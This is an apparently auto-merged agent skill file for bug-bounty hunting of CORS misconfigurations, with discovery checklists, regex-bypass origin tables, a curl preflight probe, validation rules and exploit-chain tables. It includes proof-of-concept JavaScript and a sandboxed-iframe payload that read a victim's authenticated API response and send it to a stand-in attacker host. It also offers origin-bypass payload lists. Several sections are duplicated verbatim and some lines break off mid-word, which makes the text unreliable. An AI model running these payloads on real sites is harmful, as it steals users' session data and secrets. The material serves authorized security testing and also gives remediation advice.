---
name: bbhunt-cors
description: "Hunt origin reflection, null-origin trust, regex bypasses, preflight gating and credentialed cross-origin reads. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# CORS misconfiguration hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete places, params, headers, infra signals to look

- Any response with `Access-Control-*` headers but no explicit origin is a strong hint that ACAO is generated from the request `Origin`. Some apps emit CORS headers *only* when an Origin is present — always add `Origin:` before concluding "no CORS."
- Test five origin classes against authenticated endpoints: (1) arbitrary `https://evil.com`, (2) `null`, (3) subdomain/prefix/suffix variants, (4) HTTP instead of HTTPS and port variants, (5) special-character/underscore/backtick hostnames.
- The exploitability gate is BOTH `Access-Control-Allow-Origin` reflecting your test origin AND `Access-Control-Allow-Credentials: true`. `ACAO: *` plus `ACAC: true` is blocked by browsers — a non-finding for credentialed theft. `ACAO: null` without credentials is usually low impact (see network-position exception below).
- Check for missing `Vary: Origin` on dynamically generated ACAO. It enables client-side and server-side cache poisoning: a reflected-header XSS (`X-User-id`, `Origin` with `\r`) can be cached and later rendered on a direct navigation.
- Probe preflight (`OPTIONS` with `Origin`, `Access-Control-Request-Method`, `Access-Control-Request-Headers`) on APIs that use PUT/DELETE/custom auth headers — a permissive preflight means the attacker origin can issue authenticated state changes, not just reads.
- Look for the "context-dependent trust" case: the app doesn't trust itself but trusts related domains/subdomains. A dangling CNAME in a trusted subdomain then becomes a CORS read primitive (cross-

### Signals and surfaces

### Crown Jewel Targets

- **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
  sets `ACAC: true` → any site reads authed API responses. The classic High.
- **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
- **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
  correct payload depends on *which* flaw (see Phase 3 — this is where most
  skills get it wrong).
- **Subdomain takeover → trusted origin** — a dangling subdomain that the CORS
  policy trusts; take it over, host the PoC there (see subdomain-takeover).
- **postMessage missing/loose origin check** — handler that processes
  `event.data` without strictly validating `event.origin`.

---

### Attack Surface Signals

```
Any endpoint returning an Access-Control-Allow-Origin header
API endpoints:   /api/*, /v1/*, /graphql
Profile/account: /api/me, /api/profile, /api/user, /api/session
Secrets/tokens:  /api/tokens, /api/keys, /api/csrf, /api/account/settings
Financial:       /api/balance, /api/transactions
Admin/internal:  /api/admin/*, /api/internal/*
```

Prioritize endpoints that (a) require a session cookie and (b) return PII,
tokens, CSRF tokens, or other secrets in the body.

---

### Crown Jewel Targets

- **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
  sets `ACAC: true` → any site reads authed API responses. The classic High.
- **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
- **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
  correct payload depends on *which* flaw (see Phase 3 — this is where most
  skills get it wrong).
- **Subdomain takeover → trusted origin** — a dangling subdomain that the CORS
  policy trusts; take it over, host the PoC there (see hunt-subdomain).
- **postMessage missing/loose origin check** — handler that processes
  `event.data` without strictly validating `event.origin`.

---

### Techniques, payloads and bypasses

### Phase 3 — Subdomain / trusted-origin regex bypass

The right payload depends on **which** regex flaw the server has. Identify the
class first, then send the matching payload. Getting this wrong wastes the test
and produces false negatives.

| Server regex (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Why |
|---|---|---|---|
| `^https?://.*\.target\.com$` | **None** — escaped dot + end-anchor. Correct. | (no simple bypass) | `evil.target.com` is in-scope by design; `x.target.com.evil.com` ENDS in `.evil.com`, fails `$`. Move on or look for subdomain-takeover. |
| `^https?://.*target\.com$` | **Missing dot separator** (no `\.` before `target`) | `https://eviltarget.com` | `.*target\.com$` matches `eviltarget.com` — attacker registers `eviltarget.com`. |
| `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
| `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
| `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unu

### Phase 4 — Pre-flight (OPTIONS) gating bypass

Non-simple requests (custom headers, `PUT`/`DELETE`/`PATCH`, non-simple
`Content-Type`) trigger a CORS **pre-flight** `OPTIONS`. The browser only sends
the real request if the pre-flight response authorizes the method/header. Two
things to test:

1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**
   If `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` reflect
   whatever you ask for, a malicious origin can drive state-changing requests
   (chain to CSRF-style writes that JSON/SameSite would otherwise block).

```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
  | grep -i "access-control"
# Vulnerable: ACAO reflects evil.com + ACAC:true +
#   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
# => attacker origin can issue authed PUT/DELETE with custom headers.
```

2. **Is the pre-flight even enforced server-side?** Some servers reflect the
   origin on `OPTIONS` but the actual GET/POST also reflects — the read path is
   the bug; the pre-flight just confirms write-path reach. Test the GET/POST
   directly too — never assume the pre-flight result equals the real-request
   result. Confirm in a browser, because curl ignores CORS entirely.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Origin reflection — the classic PoC (sends victim cookies, exfiltrates body):
  ```
  GET /accountDetails HTTP/1.1
  Host: target
  Origin: https://evil.com
  Cookie: session=...
  ```
  ```
  var req = new XMLHttpRequest();
  req.onload = () => location='//attacker/log?key='+this.responseText;
  req.open('get','https://target/accountDetails',true);
  req.withCredentials = true; req.send();
  ```
- Null origin — obtainable by any site via sandboxed iframe:
  ```
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
   srcdoc="<script>...xhr withCredentials=true ... location='https://attacker/log?key='+encodeURIComponent(this.responseText)</script>"></iframe>
  ```
  Also reachable from `data:` / `file:` contexts.
- Regex/allowlist bypasses (PortSwigger URL-validation cheat sheet payload families):
  - trusted string as substring: `https://target.evil.com`, `https://eviltarget.com`, `https://target.com.attacker.com`
  - Chrome/Firefox accept underscores: `Origin: https://target.application_.arbitrary.com`
  - Safari accepts `}`/backtick: `https://example.com}.attacker.com/`, `https://example.com`.attacker.com/`
  - startswith checks: `https://target.evil.com`, `https://target@evil.com`
  - loopback normalizations: `127.1`, `0`, `0x7f000001`, IPv6 forms when localhost/metadata is string-blocked.
- Trusted insecure protocol: application over HTTPS but ACAO reflects `http://target.evil.com` -> active MITM bypasses HTTPS; HSTS/Secure cookies do not help.
- XSS on a whitelisted subdomain:

### Phase 3 — Subdomain / trusted-origin regex bypass

The right payload depends on **which** regex flaw the server has. Identify the
class first, then send the matching payload. Getting this wrong wastes the test
and produces false negatives.

| Server regex (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Why |
|---|---|---|---|
| `^https?://.*\.target\.com$` | **None** — escaped dot + end-anchor. Correct. | (no simple bypass) | `evil.target.com` is in-scope by design; `x.target.com.evil.com` ENDS in `.evil.com`, fails `$`. Move on or look for subdomain-takeover. |
| `^https?://.*target\.com$` | **Missing dot separator** (no `\.` before `target`) | `https://eviltarget.com` | `.*target\.com$` matches `eviltarget.com` — attacker registers `eviltarget.com`. |
| `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
| `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
| `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unu

### Validation and proof

### Validation discipline (read before submitting)

- **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
  Show a screenshot/console log of the authed body read from `evil.com`. If the
  fetch throws / logs `BLOCKED`, you have nothing.
- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
  wildcard if the data is sensitive unauthenticated (then it is usually Low).
- **`ACAC: true` alone proves nothing** — it must pair with your reflected
  origin AND a successful readable cross-origin body.
- **Match the regex class to the payload (Phase 3).** Do not submit
  `target.com.evil.com` against an end-anchored escaped-dot regex — it does not
  match and is not a bug.
- **`evil.target.com` reflecting is not automatically a bug** — it is an
  in-scope subdomain by design unless you can actually control it.
- **OOB confirmation** for blind/headless contexts: exfil the read body to a
  Burp Collaborator / oastify host and show the interaction. Use a unique
  per-test marker so the hit is unambiguously yours.
- **Sensitive data requirement.** A readable `/api/health` is not High. Tie the
  read to PII, tokens, secrets, or financial data to justify severity.

**Severity:**
- Reflects attacker origin + creds + sensitive body, browser-proven: High
- Pre-flight authorizes attacker-origin state change on sensitive action: High
- Null-origin + sensitive authed body, browser-proven: Medium–High
- Subdomain-takeover/XSS-assisted credentialed read: High/Critical
- Reflects origin, no credentials / non-sensitive: Low–Informational
- `ACAO: *` onl

### C. Validation / proof bar — how to confirm and avoid false positives

- Header reflection alone is not impact. Prove a browser can read victim-specific data: deliver the PoC to a logged-in test victim and show their API key/CSRF token/PII in your server log. A logged response in Burp is not enough.
- Always confirm `ACAC: true` plus a non-wildcard ACAO. Without credentials, the finding is usually Low/Informational unless network position (intranet) or a token-in-URL is involved.
- Avoid the classic false positive: `ACAO: *` with `ACAC: true` is invalid per spec and browsers refuse credentialed reads — do not report it as CORS theft.
- Re-run the exact PoC twice and confirm reproducibility; note any browser-specific requirement (Safari backtick payloads, IE/Edge CRLF) so triage uses the right browser.
- Check cache behavior explicitly: if you claim cache poisoning, show the cached response being served on a clean request without the malicious header, and verify `Vary: Origin` is absent.
- For preflight findings, show an actual authenticated state-changing cross-origin request succeeding (not just reflective headers on OPTIONS).
- Defensive framing: replace dynamic reflection with an exact-match allowlist, never whitelist `null`, never allow HTTP origins on an HTTPS app, add `Vary: Origin`, and remember CORS is not a substitute for server-side authorization.

### Escalation and related chains

### Chain Table

| CORS finding | Chain to | Impact |
|---|---|---|
| Reflects attacker origin + creds | Browser-read `/api/me`, `/api/tokens`, `/api/csrf` | PII + token + CSRF-token theft → often ATO |
| Reflects origin + reads CSRF token | csrf: steal token → forge state change | CSRF on CSRF-protected forms |
| Pre-flight allows arbitrary method/header | Drive authed `PUT`/`DELETE` from evil origin | Cross-origin state change |
| Trusted subdomain has XSS | xss → run 5a from trusted origin | Reliable credentialed read |
| Dangling trusted subdomain | subdomain-takeover takeover → host 5c there | Full credentialed read |
| postMessage no/loose origin check | dom: inject iframe, send crafted message | DOM XSS / client auth bypass |

---

### Chain Table

| CORS finding | Chain to | Impact |
|---|---|---|
| Reflects attacker origin + creds | Browser-read `/api/me`, `/api/tokens`, `/api/csrf` | PII + token + CSRF-token theft → often ATO |
| Reflects origin + reads CSRF token | hunt-csrf: steal token → forge state change | CSRF on CSRF-protected forms |
| Pre-flight allows arbitrary method/header | Drive authed `PUT`/`DELETE` from evil origin | Cross-origin state change |
| Trusted subdomain has XSS | hunt-xss → run 5a from trusted origin | Reliable credentialed read |
| Dangling trusted subdomain | hunt-subdomain takeover → host 5c there | Full credentialed read |
| postMessage no/loose origin check | hunt-dom: inject iframe, send crafted message | DOM XSS / client auth bypass |

---

## Source skills merged into this topic

- `hunting` — `cors`
- `cbh` — `hunt-cors`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
